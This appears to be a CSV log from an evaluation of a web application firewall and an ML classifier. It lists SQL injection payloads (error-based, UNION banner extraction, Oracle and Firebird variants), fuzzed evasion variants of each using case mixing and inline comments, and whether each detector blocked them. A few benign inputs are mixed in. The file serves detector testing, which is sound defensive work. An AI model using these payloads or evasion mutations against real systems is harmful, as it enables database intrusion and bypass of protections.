Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
1,2024-12-16T15:04:30.888927,"-2013""   )    )    as kisy where 3802  =  3802 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",403,403,200,waf_correct_ml_incorrect,"-2013""   )	   )    As kisy whErE 3802  =  3802 oR 5903   Like     (  'qqpjq'||  (  selECT CAse 5903 when (SeLECt 5903) tHEn  oR 0 ELsE ' !3d' LIKE ' !3d' End fROm rdb$database  )  ||'qzvzq'  ) /**/--",2024-12-16T15:04:39.439537,403,200,waf_correct_ml_incorrect,"-'EA'<>'EA;'""   )
   )    aS kisy whErE 3802   lIKE   3802 Or 5903   lIKE     (  'qqpjq'||  (  selEcT CAse 5903 wHEn (SelECT 5903) THEN  Or (SEleCt (sElecT 1)) ELse ' !3d' liKe ' !3d' EnD from rdb$database  )  ||'qzvzq'  )  --",2024-12-16T15:04:49.958884,403,200,waf_correct_ml_incorrect,"-'EA'<>'EA;'""   )	   )    aS kisy WhERe 3802   LIKE   0xeda oR 5903   likE     (  'qqpjq'||  (  sElECT case  AND 1 wheN (sEleCT 5903) then  or (SeLect (sElect/*kq)*/'YP' LIkE 'YP')) ElSe ' !3d' LiKE ' !3d' End fRom rdb$database  )   or 'qzvzq'  )  --",2024-12-16T15:05:01.900337,403,200,waf_correct_ml_incorrect,"-'EA'!='EA;'""   )    )    As kisy WhEre (SELECT 3802)   LIke   0xeda or 5903   likE     (  'qqpjq'||  (  SElEcT caSE  ANd (SELECT 1) when (sELeCt '.I' NOT LIKE '.I#') tHEn  or (selEct (SeLeCt/*kq)*/'YP' LIKE 'YP')) Else/**/' !3d' lIKE ' !3d' EnD frOM rdb$database  )   oR 'qzvzq'  )  --",2024-12-16T15:05:14.438002,403,403,both_correct,"-'EA'!='EA;'""   )    )    aS kisy whErE/**/(SElECT 0xeda)   LIkE   0xeda or (SeleCt 1)   liKE     (  'qqpjq'||  (  seLecT cAsE  aNd	(SElEcT 3330<>3331) WHeN (sELEct '.I' not like '.I#') Then  or (SelEcT (selECT/*kq)*/'YP' LikE 'YP')) elsE/*>v6z#*/' !3d' Like ' !3d' EnD FroM rdb$database  )   Or 'qzvzq'  )  --",2024-12-16T15:05:29.004424,403,200,waf_correct_ml_incorrect
2,2024-12-16T15:05:44.611792,"c/ ereta, 104,",200,200,200,both_correct,"c/
ereta, (SelECt /**/OR 'r%]'!='r%]a'),",2024-12-16T15:05:45.413363,200,200,both_correct,"c/
ereta,	(sElecT/**//**/OR 'r%]' NOT LIKE 'r%]a'),",2024-12-16T15:05:48.403707,200,403,waf_correct_ml_incorrect,"c/	ereta,	(seLECt/**//**/oR 'r%]' not/**/LIkE 'r%]a'),",2024-12-16T15:05:51.880791,200,200,both_correct,"c/	ereta,	(SelECt /**/Or
'r%]' not/**/lIKE 'r%]a'),",2024-12-16T15:05:55.496213,200,200,both_correct,"c/	ereta,	(SEleCt /**/oR 'r%]' not lIKE 'r%]a'),",2024-12-16T15:05:59.031700,200,200,both_correct
3,2024-12-16T15:06:02.353348,pechur@spainbareback.fm,200,200,200,both_correct,pechur@spainbareback.fm,2024-12-16T15:06:03.558585,200,200,both_correct,pechur@spainbareback.fm,2024-12-16T15:06:05.733803,200,200,both_correct,pechur@spainbareback.fm,2024-12-16T15:06:07.960697,200,200,both_correct,pechur@spainbareback.fm,2024-12-16T15:06:10.174884,200,200,both_correct,pechur@spainbareback.fm,2024-12-16T15:06:12.414592,200,200,both_correct
4,2024-12-16T15:06:14.553236,cele959n3s0o,200,200,200,both_correct,cele959n3s0o,2024-12-16T15:06:15.251461,200,200,both_correct,cele959n3s0o,2024-12-16T15:06:17.101441,200,200,both_correct,cele959n3s0o,2024-12-16T15:06:18.874039,200,200,both_correct,cele959n3s0o,2024-12-16T15:06:20.600311,200,200,both_correct,cele959n3s0o,2024-12-16T15:06:22.318825,200,200,both_correct
5,2024-12-16T15:06:24.013538,1'+  (  select 'leok' where 4320  =  4320,403,403,403,both_correct,"9454 LIKE 9454'+
 (  select 'leok' WHere 0x10e0   like /**/ (SELECT 1)",2024-12-16T15:06:26.047299,403,403,both_correct,"(SelEct 1)/**/lIke 0x24ee'+
 (  select 'leok' WHERe 0x10e0  	LIKe /**/ (SelEcT 1479!=1480)",2024-12-16T15:06:30.456873,403,200,waf_correct_ml_incorrect,(SelECt 0x1) LiKe 0x24ee'+  (  select 'leok' WhERe 0x10e0  	LiKe /**/ (SeLeCT  oR 9266=9266 not like 1480),2024-12-16T15:06:35.796571,403,403,both_correct,"(SEleCt
0x1) lIKE 0x24ee'+  (  select 'leok' WhERe 0x10e0  	LiKE /*e)F*//**/(seLEcT  Or (SELECT 9266) LIKE  OR 0 not like '?'<>'?l')",2024-12-16T15:06:41.882790,403,403,both_correct,"(sELECT
0x1) LikE 0x24ee'+  (  select 'leok' WhERe 0x10e0   LiKE /*e)F*/ (seLEcT  Or (SELECT  AND 1) LIKE  OR 4823 LIKE (SELECT 4823) not like '?'<>'?l')",2024-12-16T15:06:49.352263,403,403,both_correct
6,2024-12-16T15:06:57.530163,7x,200,200,200,both_correct,7x,2024-12-16T15:06:57.767643,200,200,both_correct,7x,2024-12-16T15:06:58.985779,200,200,both_correct,7x,2024-12-16T15:07:00.211023,200,200,both_correct,7x,2024-12-16T15:07:01.443685,200,200,both_correct,7x,2024-12-16T15:07:02.674875,200,200,both_correct
7,2024-12-16T15:07:03.903788,"-4889""   )    )    as vvuo where 8060  =  8060 or   (  8459  =  8459  )  *4906--",403,403,200,waf_correct_ml_incorrect,"-4889""   )    )    AS vvuo Where 8060  =  8060 or /**/ (  ''!='!' 
 LIKE   0x210b  )  * AND 1--",2024-12-16T15:07:07.681051,403,403,both_correct,"- AND 'I	' NOT LIKE 'I	P'""   )    )    as vvuo WHErE 8060  =  (SELECT 8060) or   (  '' NOT LIKE '!'	
 LiKe   0x210b  )  * anD 1--",2024-12-16T15:07:13.314639,403,403,both_correct,"- anD 'I	' not like 'I	P'""   )    ) 	  As vvuo WhERe 'Vy;qe'/**/NOT LIKE 'Vy;qe)'  =  (seLEcT (SELECT 0x1)) OR   (  '' NOT LIKE '!'	
 liKe   0x210b  )  * anD 1--",2024-12-16T15:07:20.783527,403,403,both_correct,"- AnD 'I ' not like 'I	P'""   )    ) 	  as vvuo wheRe 'Vy;qe'/*<]E_
*/NOT LIKE 'Vy;qe)'   like   (seLeCT (sEleCT 0x1)) oR   (  '' NOT LIKE '!'	
 like   0x210b  )  */**/aND  aND (SELECT 3112) IN (3111,3112,3113)--",2024-12-16T15:07:29.485651,403,403,both_correct,"- anD 'I ' not like 'I	P'""   )    )    as vvuo WHEre 'Vy;qe'/**/not like 'Vy;qe)'   LIKe   (selECT (SeleCT 0x1)) or   (  '' NOT LIKE '!'	
 lIKe   0x210b  )  * AND  and (SeLecT  ANd 1) IN (3111,702!=703,0xc29)--",2024-12-16T15:07:40.276880,403,403,both_correct
8,2024-12-16T15:07:51.377389,"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'tmwy'  =  'tmwy",403,403,403,both_correct,"(SELECT 1)' and   (  select  OR 0*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,6838!=6839   ) 
  )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610 /**/ )    )     )   and 'tmwy'  =  'tmwy",2024-12-16T15:08:03.520636,403,403,both_correct,"(SELEcT 'e'<>'e-')' and   (  select  OR (SELECT  AND 1)*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,6838!=6839   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610 /**/ )    )     )   and 'tmwy'  =/**/ 'tmwy",2024-12-16T15:08:18.295700,403,403,both_correct,"(SELEcT 'e' not like 'e-')'
and   (  select  OR (SELECT  AND 1)*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,6838!=6839   )    )     )  ,0x717a767a71,0x78   )    )   s  )  ,  AND 1, (SELECT 6990) LIKE 6990   )    )     )   and 'tmwy'  =/*SjDc*/ 'tmwy",2024-12-16T15:08:34.064894,403,403,both_correct,"(sEleCT 'e' not like 'e-')'
and   (  select  OR (SELECT  AND 1)*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,'rl'<>'rl1'!=6839   )    )     )  ,0x717a767a71,0x78   )   /*H*hR>*/)   s  )  ,  AND (SELECT 1), (SELECT 6990) LIKE  OR 0   )    )     )   and
'tmwy'  =/**/ 'tmwy",2024-12-16T15:08:49.543895,403,403,both_correct,"(SElEcT 'e' not like 'e-')'
and   (  select  OR (SELECT  AND 1)*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  (SELECT 3484),'rl'<>'rl1'!=6839   )    )   
 )  ,0x717a767a71,0x78   )   /*H*hR>*/)   s  )  ,  AND (SELECT (SELECT 1)), (SELECT '.'<>'.?') LIKE  OR 0   )    )     )   and
'tmwy'  =  'tmwy",2024-12-16T15:09:06.437417,403,403,both_correct
9,2024-12-16T15:09:24.211214,-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',403,403,200,waf_correct_ml_incorrect,-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  9887=9887	 )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  (SELECT 122)  )  ||chr  (  118  )  ||chr /**/(  122  )  ||chr  (  (SELECT 1)   )    )    and    (    (   '%'  =  ',2024-12-16T15:09:41.145262,403,200,waf_correct_ml_incorrect,"-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (   AND 1  )  ||chr  (  113  )  ||chr  (  0x70  )  ||chr  (  9887=9887	 )  ||chr  (  113  )  ||  ( /**/select   (  case when   ( 	4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  (SELECT 122)  )  ||chr  (  8872<>8873  )  ||chr /*=
*/(  122  )  ||chr  (  (SELECT 1)   )    )    and    (    (   '%'  =  '",2024-12-16T15:10:00.665525,403,403,both_correct,"-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (   AND 1  )  ||chr  (  113  )  ||chr  (  0x70  )  ||chr  (  0x269f=9887	 )  ||chr  ( 
5246 LIKE 5246  )  ||  ( /*U*/select   (  case when   ( 	4493  =   AND 1  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  (SELECT 122)  )  ||chr  (  8872<>8873  )  ||chr /**/(  122  )  ||chr  (  (SELECT 1)   )/**/   )    and    (    (   '%'  =  '",2024-12-16T15:10:20.850505,403,403,both_correct,"-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (   AND 1  )  ||chr  (  113  )  ||chr  (  0x70  )  ||chr  (  0x269f=9887	 )  ||chr  ( 
5246 LIKE '/'='/'  )  ||  ( /*	*/select   (  case when   ( 	4493  =   AND 1  )   then 1 else 0 end  )   from dual
 )  ||chr  (  113  )  ||chr  (  (SELECT 0x7a)  )  ||chr  (  8872<>8873  )  ||chr /**/(   OR 0  )  ||chr  (  (SELECT 1)   )    )    and    (    (   '%'  =  '",2024-12-16T15:10:41.749189,403,403,both_correct,"-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (   AND 1  )  ||chr /**/(  113  )  ||chr  (  0x70  )  ||chr  (  0x269f= AND 1	 )  ||chr  ( 
5246 LIKE '/'='/'  )  ||  ( /**/select   (  case when   ( 	4493  =  	AND 1  )   then 1 else 0 end  )   from dual
 )  ||chr  (  113  )  ||chr  (  (SELECT 0x7a)  )  ||chr  (  8872<>8873  )  ||chr /**/(   OR 0  )  ||chr  (  (SELECT 7102!=0x1bbf)   )    )    and    (    (   '%'  =  '",2024-12-16T15:11:02.918560,403,403,both_correct
10,2024-12-16T15:11:25.665875," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",403,403,403,both_correct," SElect * FROM users WHere id   LikE   1/**/union SElECt (sEleCT 1),banner	frOM v$version whErE rownum  =  1071!=0x430 -- 1",2024-12-16T15:11:30.402528,403,403,both_correct," seleCT * frOM users wheRe id   LIKe  
1 union sELeCt (seLECT '!6I' like '!6I'),banner	FRom v$version wheRE rownum  =  (Select 1071)!=0x430 --  AND 1",2024-12-16T15:11:37.376989,403,403,both_correct," SEleCt * frOM users WhERE id   LIKE   'g'='g' union sELECt (SELecT '!6I' LIKe '!6I'),banner	froM v$version wHeRE rownum  =  (SEleCT/**/1071) NOT LIKE 0x430 --  AND  AND 0x1X",2024-12-16T15:11:45.376764,403,403,both_correct," sElEcT * from users WhERe id   lIke   'g' like 'g' union SEleCT (SeLect '!6I' liKe '!6I'),banner froM v$version wherE rownum  =  (selECT (seLECT 7256<>0x1c59)) NOT LIKE 0x430 --  AND  AND 0x1X]",2024-12-16T15:11:54.802317,403,403,both_correct," SElecT * fROm users wHere id /*#[>*/ Like   'g' lIKE 'g' union seLEcT (SeLeCT	'!6I' LiKE '!6I'),banner from v$version WherE rownum  =  (selECt (Select 0x100b IN (4106,4107, OR 0) not like 0x1c59)) NOT LIKE 0x430 --  AND  AND 0x1X]",2024-12-16T15:12:04.887397,403,403,both_correct
